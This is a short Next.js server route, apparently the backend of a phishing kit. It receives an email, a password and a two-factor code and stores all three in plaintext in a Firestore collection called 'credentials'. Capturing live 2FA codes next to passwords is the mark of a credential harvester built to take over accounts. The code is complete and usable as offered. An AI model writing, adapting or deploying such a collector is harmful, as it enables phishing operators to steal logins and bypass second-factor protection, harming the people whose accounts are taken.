import { db } from "../../../lib/firebase";
import { collection, addDoc } from "firebase/firestore";
import { NextResponse } from "next/server";

export async function POST(request) {
  try {
    const { email, password, twofa } = await request.json();
    await addDoc(collection(db, "credentials"), {
      email,
      password,
      twofa: twofa || "N/A",
      timestamp: new Date(),
    });
    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error("Error saving credentials:", error);
    return NextResponse.json(
      { error: "Internal Server Error" },
      { status: 500 }
    );
  }
}
